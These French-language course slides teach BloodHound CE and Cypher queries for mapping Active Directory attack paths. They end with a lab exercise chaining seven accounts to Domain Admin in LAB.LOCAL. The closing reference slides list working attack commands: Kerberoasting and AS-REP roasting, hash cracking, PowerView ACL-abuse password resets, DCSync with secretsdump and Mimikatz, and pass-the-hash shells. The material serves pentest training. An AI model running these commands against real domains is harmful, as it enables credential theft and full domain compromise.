BloodHound CE

Présentation

Rôle · Architecture · Installation · Collecte

BloodHound CE - Rôle

  • BloodHound est un outil d'analyse des chemins d'attaque dans Active Directory (et Azure AD). Il représente le domaine comme un graphe orienté : les objets AD sont des noeuds, les relations entre eux sont des arêtes.
  • Son originalité : il visualise des chemins d'escalade de privilèges non évidents. Une chaîne de 5 délégations de droits peut mener à un Domain Admin alors qu'aucune permission individuelle ne semble critique.
  • BloodHound CE (Community Edition) est la version open-source maintenue par SpecterOps depuis 2023. Elle remplace l'ancienne version standalone et introduit une interface web, une API REST et une architecture microservices (Docker).
  • Usage dual : outil offensif pour les pentesters / red teamers, outil défensif pour les administrateurs qui souhaitent cartographier leur surface d'attaque avant un attaquant.
Source : github.com/SpecterOps/BloodHound - licence Apache 2.0

Architecture BloodHound CE

① Collecte     SharpHound.exe      →  fichiers JSON (.zip)

               (ou AzureHound pour Azure AD)

② Ingestion    Interface web BH CE  →  import ZIP → Neo4j

③ Stockage     Neo4j (base graphe)   =  noeuds + relations AD

④ Analyse      Interface web BH CE  →  graphe interactif + Cypher

SharpHound (collecteur)

  • Agent C# - s'exécute depuis n'importe quelle session utilisateur du domaine
  • Collecte via LDAP : utilisateurs, groupes, GPO, OUs, ACL, délégations
  • Collecte via SMB : sessions actives sur les machines (NetSessionEnum)
  • Génère un fichier ZIP contenant plusieurs JSON

BloodHound CE (analyse)

  • Interface web React - accessible sur localhost:8080
  • Backend Go + base Neo4j dans des conteneurs Docker
  • Requêtes Cypher natives sur Neo4j via l'onglet Raw Query
  • Chemins prédéfinis + chemins personnalisés

Cypher - Concept de base

Cypher est à Neo4j ce que SQL est à MySQL. Sa syntaxe est visuelle : elle représente les patterns du graphe tels qu'on les dessinerait.

Deux interfaces : BloodHound CE Raw Query pour visualiser des noeuds/chemins (RETURN n, RETURN p) - Neo4j Browser (localhost:7474) pour tout ce qui retourne des scalaires (count, n.name, listes…). Voir slide précédente.

Notation des noeuds

(n)              -- noeud quelconque
(n:User)         -- noeud de type User
(n:User {enabled: true})
                 -- noeud User avec propriété
(n:User {name: 'ADMIN@DOMAIN'})

Notation des relations

(a)-[r]->(b)          -- relation quelconque
(a)-[:MemberOf]->(b)  -- relation typée
(a)-[r:MemberOf]->(b) -- capturée dans r
(a)<-[:AdminTo]-(b)   -- direction inversée
(a)-[:REL]-(b)        -- non dirigée
La structure d'une requête Cypher suit toujours l'ordre : MATCH (trouver le motif) → WHERE (filtrer) → RETURN (retourner les résultats). Les autres clauses sont optionnelles.

Cypher - MATCH et labels

-- [BH CE + Neo4j Browser] Tous les noeuds d'un type - s'affichent dans le graphe BH
MATCH (n:User)     RETURN n LIMIT 10
MATCH (n:Computer) RETURN n LIMIT 10
MATCH (n:Group)    RETURN n LIMIT 10

-- [Neo4j Browser uniquement] Retourner des propriétés scalaires
MATCH (n:User) RETURN n.name, n.enabled LIMIT 10

-- [Neo4j Browser uniquement] Compter les résultats
MATCH (n:User) RETURN count(n)

-- [Neo4j Browser uniquement] Voir quels labels (types) existent dans la base
MATCH (n) RETURN DISTINCT labels(n)
Toujours mettre un LIMIT sur les premières requêtes. Une base BloodHound peut contenir des milliers de noeuds - sans LIMIT, l'affichage est inutilisable et peut ralentir Neo4j.

Cypher - WHERE et filtres

-- [Neo4j Browser] Égalité - retourne des noms (scalaires)
MATCH (n:User) WHERE n.enabled = TRUE RETURN n.name

-- [BH CE] Même filtre mais retourne le noeud entier - s'affiche dans le graphe
MATCH (n:User) WHERE n.enabled = TRUE RETURN n LIMIT 20

-- [Neo4j Browser] Plusieurs conditions
MATCH (n:User)
WHERE n.enabled = TRUE AND n.dontreqpreauth = TRUE
RETURN n.name, n.admincount

-- [BH CE + Neo4j Browser] Opérateur IN - RETURN n s'affiche dans le graphe BH
MATCH (n:User) WHERE n.name IN ['ALICE@LAB.LOCAL', 'BOB@LAB.LOCAL'] RETURN n

-- [Neo4j Browser] Fonctions sur les chaînes
MATCH (n:User) WHERE toLower(n.name) STARTS WITH 'marie' RETURN n.name
MATCH (n:User) WHERE n.name CONTAINS 'ADMIN' RETURN n.name

-- [Neo4j Browser] Propriété existante (non nulle)
MATCH (n:User) WHERE n.description IS NOT NULL RETURN n.name, n.description

-- [Neo4j Browser] Ordonner et paginer
MATCH (n:User) WHERE n.enabled = TRUE
RETURN n.name ORDER BY n.name LIMIT 20

Cypher - Agrégations

Toutes les requêtes de cette slide retournent des scalaires → Neo4j Browser uniquement

-- Compter tous les utilisateurs activés
MATCH (n:User) WHERE n.enabled = TRUE
RETURN count(n) AS nb_users

-- Compter les valeurs distinctes
MATCH (n:User) RETURN count(DISTINCT n.enabled) AS nb_valeurs_enabled

-- Regrouper : compter les membres par groupe
MATCH (u:User)-[:MemberOf]->(g:Group)
RETURN g.name, count(u) AS nb_membres
ORDER BY nb_membres DESC LIMIT 15

-- Collecter les valeurs dans une liste
MATCH (u:User)-[:MemberOf]->(g:Group {name:'DOMAIN ADMINS@LAB.LOCAL'})
RETURN collect(u.name) AS membres_DA

-- Taille d'une liste / d'un chemin
MATCH (u:User)-[:MemberOf]->(g:Group)
WITH g, count(u) AS nb WHERE nb > 50
RETURN g.name, nb
count(n) compte les noeuds. collect(n.name) crée une liste. WITH permet de filtrer sur un résultat agrégé - équivalent du HAVING en SQL.

Cypher - Traverser les relations

-- [Neo4j Browser] Relation directe - retourne paires de noms
MATCH (u:User)-[:MemberOf]->(g:Group) RETURN u.name, g.name LIMIT 20

-- [Neo4j Browser] Capturer le type de la relation
MATCH (a)-[r]->(b:Group {name:'DOMAIN ADMINS@LAB.LOCAL'})
RETURN a.name, type(r), labels(a)

-- [BH CE + Neo4j Browser] Plusieurs types - RETURN src,dst affiche les noeuds dans BH
MATCH (src)-[r:GenericAll|WriteDACL|WriteOwner]->(dst)
RETURN src, dst LIMIT 30

-- [Neo4j Browser] Même requête avec noms et type de droit (scalaires)
MATCH (src)-[r:GenericAll|WriteDACL|WriteOwner]->(dst)
RETURN src.name, type(r) AS droit, dst.name, labels(src), labels(dst)
LIMIT 30

-- [Neo4j Browser] Relation récursive : membres directs ET indirects
MATCH (u:User)-[:MemberOf*1..]->(g:Group)
WHERE g.name = 'DOMAIN ADMINS@LAB.LOCAL'
RETURN u.name

Cypher - Chemins et shortestPath

-- Chemin le plus court entre deux noeuds (n'importe quel type de relation)
MATCH p = shortestPath(
  (start:User {name:'OLLIE_HOUSTON@LAB.LOCAL'})-[*1..10]->(end:Group {name:'DOMAIN ADMINS@LAB.LOCAL'})
)
RETURN p

-- Extraire les noeuds et les types de relations d'un chemin
MATCH p = shortestPath(
  (start:User {name:'OLLIE_HOUSTON@LAB.LOCAL'})-[*1..10]->(end:Group {name:'DOMAIN ADMINS@LAB.LOCAL'})
)
RETURN [n IN nodes(p) | n.name] AS noeuds,
       [r IN relationships(p) | type(r)] AS relations

-- Tous les chemins les plus courts (pas seulement un seul)
MATCH p = allShortestPaths(
  (start:User {name:'OLLIE_HOUSTON@LAB.LOCAL'})-[*1..10]->(end:Group {name:'DOMAIN ADMINS@LAB.LOCAL'})
)
RETURN p LIMIT 5
[*1..] = longueur variable (1 ou plus). [*1..5] = 1 à 5 sauts. Sans borne supérieure, Neo4j peut partir en timeout sur de grands graphes - toujours borner avec ..10 ou moins.

Cypher - WITH et requêtes chaînées

-- WITH : passer des résultats d'une clause à la suivante (comme un pipe)
-- [Neo4j Browser] Groupes avec plus de 10 membres - retourne noms et comptage
MATCH (u:User)-[:MemberOf]->(g:Group)
WITH g, count(u) AS nb_membres
WHERE nb_membres > 10
RETURN g.name, nb_membres
ORDER BY nb_membres DESC

-- [BH CE + Neo4j Browser] DA et comptes qui ont des droits sur eux
-- RETURN attacker, victim s'affiche dans BH ; avec .name uniquement dans Neo4j Browser
MATCH (da:User)-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@LAB.LOCAL'})
WITH collect(da) AS da_list
MATCH (attacker)-[r]->(victim)
WHERE victim IN da_list
  AND type(r) IN ['GenericAll','WriteDACL','ForceChangePassword','WriteOwner']
RETURN attacker.name, type(r) AS droit, victim.name
WITH est l'équivalent d'une sous-requête ou d'un INTO en SQL. Il permet de filtrer sur des valeurs agrégées (count, collect) et de chaîner plusieurs patterns.

Cypher - Récapitulatif des clauses

ClauseRôleÉquivalent SQL

OPTIONAL MATCHComme MATCH mais retourne NULL si pas de résultatLEFT JOIN

Méthodologie de reconnaissance BloodHound

Ordre d'analyse recommandé pour un attaquant avec accès non-privilégié :

① Comptes vulnérables à l'exploitation offline

AS-REP Roasting → hashes sans authentification préalable

Kerberoasting → hashes avec authentification standard

② Compte obtenu - que peut-il faire ?

Droits sortants (Outbound Object Control) - ACE directes sur d'autres objets

Appartenance à des groupes avec droits (MemberOf → droits hérités)

③ Cibles prioritaires

Chemins courts vers Domain Admins, Enterprise Admins, Backup Operators

④ Configurations dangereuses

Unconstrained Delegation, WriteDACL sur Domain, DCSync directs

Partie C

Les 7 Samouraïs

Exercice de synthèse - Chaîne d'attaque complète

Contexte de l'exercice

Point de départ : le compte MARIE_CANTRELL@LAB.LOCAL est identifié comme vulnérable dans BloodHound. Son hash NT vous sera fourni par l'enseignant en début d'exercice.
  • Une chaîne de 7 comptes relie ce compte à un Domain Admin. Chaque transition utilise une technique différente.
  • Le 7ème compte est un Domain Admin. Atteindre son hash NT est l'objectif final.
  • Les comptes intermédiaires sont des utilisateurs BadBlood normaux - rien dans leur nom n'indique leur rôle. C'est à vous de trouver le chemin.
  • Tout l'exercice se fait depuis BloodHound CE. Vous n'avez pas besoin de contacter le DC : trouvez le chemin, comprenez chaque technique, expliquez comment elle serait exploitée dans un vrai engagement.
Méthode : commencez par analyser les droits sortants de MARIE_CANTRELL (Outbound Object Control dans le panneau latéral, ou requête Cypher). Identifiez la première relation exploitable, progressez de compte en compte.

Référence - AS-REP Roasting & Kerberoasting

# AS-REP Roasting - depuis Kali, sans credentials (compte AS-REP Roastable)
GetNPUsers.py LAB.LOCAL/ -usersfile users.txt -no-pass -dc-ip 192.168.x.x -outputfile asrep.txt
# Ou directement sur un compte connu :
GetNPUsers.py LAB.LOCAL/MARIE_CANTRELL -no-pass -dc-ip 192.168.x.x

# AS-REP Roasting - depuis Windows (domaine)
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Crack AS-REP (hashcat mode 18200 = $krb5asrep$23$...)
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule

# Kerberoasting classique - lister les SPNs et demander les tickets
GetUserSPNs.py LAB.LOCAL/user:password -request -outputfile kerb.txt -dc-ip 192.168.x.x

# Kerberoasting - depuis Windows (domaine)
Rubeus.exe kerberoast /tgtdeleg /rc4opsec /outfile:kerb.txt

# Crack Kerberoast RC4 (hashcat mode 13100 = $krb5tgs$23$...)
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
Le hash cracké via Kerberoasting est le mot de passe en clair du compte de service, pas son hash NT. Pour un Pass-the-Hash, il faut d'abord convertir via Overpass-the-Hash ou se connecter normalement.

Référence - Abus des ACE (PowerView)

$pass = ConvertTo-SecureString 'NouveauMDP123!' -AsPlainText -Force

# ForceChangePassword (sam2 → sam3, via groupe avec ce droit)
Set-DomainUserPassword -Identity $sam3 -AccountPassword $pass -Credential $sam2_cred

# GenericAll sur Computer (SRV-SHARE01) → Shadow Credentials ou reset du compte machine
# Option A : Shadow Credentials (Whisker, requiert ADCS)
Whisker.exe add /target:SRV-SHARE01$ /domain:lab.local /dc:DC01
# Option B : reset du MDP du compte machine, puis utiliser son NT hash
Set-ADAccountPassword -Identity 'SRV-SHARE01$' -NewPassword $pass -Reset

# SRV-SHARE01$ a WriteDACL sur sam4 → s'accorder GenericAll puis reset MDP
Add-DomainObjectAcl -TargetIdentity $sam4 -PrincipalIdentity 'SRV-SHARE01$' `
                    -Rights All -Credential $comp_cred
Set-DomainUserPassword -Identity $sam4 -AccountPassword $pass -Credential $comp_cred

# WriteOwner (sam4 → sam5, via groupe avec ce droit)
Set-DomainObjectOwner  -Identity $sam5 -OwnerIdentity $sam4 -Credential $sam4_cred
Add-DomainObjectAcl    -TargetIdentity $sam5 -PrincipalIdentity $sam4 `
                       -Rights All -Credential $sam4_cred
Set-DomainUserPassword -Identity $sam5 -AccountPassword $pass -Credential $sam4_cred

# WriteDACL direct (sam5 → sam6)
Add-DomainObjectAcl    -TargetIdentity $sam6 -PrincipalIdentity $sam5 `
                       -Rights All -Credential $sam5_cred
Set-DomainUserPassword -Identity $sam6 -AccountPassword $pass -Credential $sam5_cred

# WriteSPN (sam6 → sam7/DA) → Targeted Kerberoasting
# WriteSPN = WriteProperty sur servicePrincipalName uniquement (Shadow Credentials impossible)
Set-ADUser -Identity $sam7 -ServicePrincipalNames @{Add='http/fake.lab.local'} `
           -Credential $sam6_cred
# Demander le TGS depuis n'importe quel compte authentifié
GetUserSPNs.py LAB.LOCAL/$sam6:$pass -target-user $sam7 -request -outputfile tgs.txt
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt

Référence - DCSync & Pass-the-Hash

# DCSync - exécuté EN TANT QUE sam7 (Domain Admin) - aucune config préalable
# sam7 possède DS-Replication-Get-Changes-All par défaut en tant que DA
secretsdump.py 'LAB.LOCAL/$sam7:NouveauMDP123!@DC01.lab.local'

# DCSync - Mimikatz (si on a injecté un shell en tant que DA)
lsadump::dcsync /domain:lab.local /all /csv   # tous les hashes NT du domaine
lsadump::dcsync /domain:lab.local /user:krbtgt # hash krbtgt → Golden Ticket possible

# Vérifier l'accès avec un hash NT (CrackMapExec)
crackmapexec smb 192.168.x.x -u $sam7 -H NTHash

# Pass-the-Hash - shell interactif
psexec.py   -hashes :NTHash LAB.LOCAL/$sam7@192.168.x.x
wmiexec.py  -hashes :NTHash LAB.LOCAL/$sam7@192.168.x.x

# Pass-the-Hash - Mimikatz (injecte dans un processus)
sekurlsa::pth /user:$sam7 /domain:LAB.LOCAL /ntlm:NTHash /run:cmd.exe
